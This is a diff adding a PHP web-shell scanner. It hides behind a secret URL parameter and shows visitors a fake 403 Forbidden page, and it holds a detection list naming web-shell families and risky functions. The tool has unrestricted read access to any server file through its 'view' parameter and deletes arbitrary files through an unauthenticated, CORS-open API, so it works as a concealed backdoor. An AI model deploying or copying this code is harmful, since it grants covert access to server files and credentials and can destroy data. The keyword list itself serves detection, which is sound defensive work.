@@ -1,0 +1,155 @@
+<?php
+// === PROTEKSI PARAMETER AKSES DENGAN CUSTOM 403 PAGE ===
+if (!isset($_GET['f168punyaScanner'])) {
+    http_response_code(403);
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="UTF-8">
+      <title>403 Forbidden</title>
+      <style>
+        body {
+  background-color: #fff;
+  color: #222;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          height: 100vh;
+          flex-direction: column;
+          font-family: sans-serif;
+        }
+        h1 {
+          font-size: 150px;
+          margin: 0;
+        }
+        h2 {
+          font-size: 30px;
+          margin: 0;
+        }
+        p {
+          font-size: 20px;
+          color: #222;
+        }
+      </style>
+    </head>
+    <body>
+      <h1>403</h1>
+      <h2>Forbidden</h2>
+      <p>Access to this resource is forbidden.</p>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+// === END PROTEKSI ===
+
+$white = [basename(__FILE__)];
+$content = ['_halt_compiler','file_get_contents\(','shell_exec\(','system\(','base64_decode\(','exec\(','base64_encode\(','webconsole','uploader','hacked','eval\(','set_time_limit\(','move_uploaded_file','hex2bin\(','bin2hex\(','WSOstripslashes','AGUSTUS_17_1945','Cyto','con7ext','Fileman','68746d6c7370656369616c6368617273','xiaoxiannv','ruzhu','edoced_46esab','Solevisible','Zeerx7','phpFileManager','Gecko','dZNOmgVpUDdbg','WSO YANZ ENC BYPASS V3.0','indoxploit','mini shell','minishell','tinyfilemanager.github.io','xleet','b374k','set_magic_quotes_runtime\(','pastebin','shell\(','alfa','filemanager'];
+$ext = ['php1','php2','php3','php4','php5','php6','php7','php8','php9','phar','phtml','pjpeg','shtml','php.black','php.ndsfx','php.cer','phar','php.fla'];
+
+function _delete($dir){if(!is_file($dir)){data('not found.');exit();}if(unlink($dir)){data('deleted');}else{data('permission denied.');}}
+function apiCheckShell($dir){if(!preg_match('/\.php/',$dir)){exit();}if(!is_file($dir)){data('not found.');exit();}global $content;$data=['file'=>$dir,'status'=>false,'reason'=>[]];foreach($content as $c){if(preg_match("/$c/",strtolower(file_get_contents($dir)))){$data['status']=true;array_push($data['reason'],str_replace("\\(","",$c));}}data('success',$data);}
+function apiCheckExt($dir){if(!is_file($dir)){data('not found.');exit();}global $ext;$data=['file'=>$dir,'status'=>false,'reason'=>''];foreach($ext as $i){if(preg_match("/$i/",strtolower(basename($dir)))){$data['status']=true;$data['reason']=$i;break;}}data('success',$data);}
+function apiScanDir($dir){global $white;if(!file_exists($dir)){data("dir not found");exit();}$s=scandir($dir);$data=['file'=>[],'dir'=>[]];foreach($s as $file){if($file==='.'||$file==='..'){continue;}$file=$dir."/".$file;$file=str_replace("//","/",$file);if(in_array(basename($file),$white)){continue;}if(is_file($file)){array_push($data['file'],$file);}else{array_push($data['dir'],$file."/");}}data("success",$data);}
+function apiCwd(){$data=getcwd();data("success",$data);}
+function data($msg,$data=null){$data=['msg'=>$msg,'data'=>$data];echo json_encode($data);}
+if(isset($_GET['view'])){$page=$_GET['view'];echo '<pre style="background:#111;color:#eee;padding:10px;">'.htmlspecialchars(file_get_contents($page)).'</pre>';exit();}
+if(isset($_GET['api'])){header('Access-Control-Allow-Origin: *');header('Content-Type: application/json');$function=$_GET['api'];switch($function){case 'delete':!isset($_GET['dir'])?data('no file.'):_delete($_GET['dir']);break;case 'shell':!isset($_GET['dir'])?data('no file.') : apiCheckShell($_GET['dir']);break;case 'ext':!isset($_GET['dir'])?data('no file.') : apiCheckExt($_GET['dir']);break;case 'scan':!isset($_GET['dir'])?data('no directory.') : apiScanDir($_GET['dir']);break;case 'cwd':apiCwd();break;default:data('no function.');}die();}
+?>
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>403 forbiden</title>
+  <meta name="robots" content="noindex,nofollow">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://cdn.datatables.net/1.13.6/css/dataTables.bootstrap5.min.css" rel="stylesheet">
+  <style>
+    body { background-color: #121212; color: #e0e0e0; }
+    td { max-width: 300px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .table td, .table th { vertical-align: middle; }
+    .container-box { max-width: 1000px; margin: auto; padding-top: 40px; }
+    .card { border: 1px solid #444; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
+    .card-header { font-weight: bold; border-bottom: 1px solid #444; }
+    .table-responsive { overflow-x: auto; }
+  </style>
+</head>
+<body>
+<div class="container-box">
+  <div class="card bg-dark text-light">
+    <div class="card-header">
+      PHP File Scanner (Dark Mode)
+    </div>
+    <div class="card-body">
+      <div class="input-group mb-4">
+        <input type="text" class="form-control bg-dark text-white border-secondary" id="path" placeholder="/var/www/html/">
+        <button class="btn btn-success" onclick="scan()">🔍 Scan</button>
+      </div>
+      <div class="table-responsive">
+        <table class="table table-dark table-striped" id="_result">
+          <thead>
+            <tr><th>File</th><th>Path</th><th>Reason</th><th>Action</th></tr>
+          </thead>
+          <tbody></tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+<script src="https://cdn.datatables.net/1.13.6/js/jquery.dataTables.min.js"></script>
+<script src="https://cdn.datatables.net/1.13.6/js/dataTables.bootstrap5.min.js"></script>
+<script>
+const table = $('#_result').DataTable();
+document.getElementById('path').value = '<?=getcwd()?>/';
+function basename(path){ return path.split('/').reverse()[0]; }
+function checkExt(path){
+  fetch('?f168punyaScanner&api=ext&dir=' + encodeURIComponent(path)).then(res => res.json()).then(res => {
+    if(res.data?.status){
+      table.row.add([
+        basename(res.data.file),
+        `<span title="${res.data.file}">${res.data.file}</span>`,
+        res.data.reason,
+        `<a class="btn btn-sm btn-primary" target="_blank" href="?f168punyaScanner&view=${res.data.file}">View</a>
+         <button class="btn btn-sm btn-danger" onclick="deleteFile('${res.data.file}')">Delete</button>`
+      ]).draw();
+    }
+  });
+}
+function checkShell(path){
+  fetch('?f168punyaScanner&api=shell&dir=' + encodeURIComponent(path)).then(res => res.json()).then(res => {
+    if(res.data?.status){
+      const reason = res.data.reason.join("<br>");
+      table.row.add([
+        basename(res.data.file),
+        `<span title="${res.data.file}">${res.data.file}</span>`,
+        reason,
+        `<a class="btn btn-sm btn-primary" target="_blank" href="?f168punyaScanner&view=${res.data.file}">View</a>
+         <button class="btn btn-sm btn-danger" onclick="deleteFile('${res.data.file}')">Delete</button>`
+      ]).draw();
+    }
+  });
+}
+function scan(path = document.getElementById('path').value){
+  fetch('?f168punyaScanner&api=scan&dir=' + encodeURIComponent(path)).then(res => res.json()).then(res => {
+    res.data.dir.forEach(scan);
+    res.data.file.forEach(file => {
+      checkShell(file);
+      checkExt(file);
+    });
+  });
+}
+function deleteFile(path){
+  fetch('?f168punyaScanner&api=delete&dir=' + encodeURIComponent(path)).then(() => {
+    table.rows().every(function(){
+      if(this.data()[1].includes(path)){ this.remove(); }
+    });
+    table.draw();
+  });
+}
+</script>
+</body>
+</html>
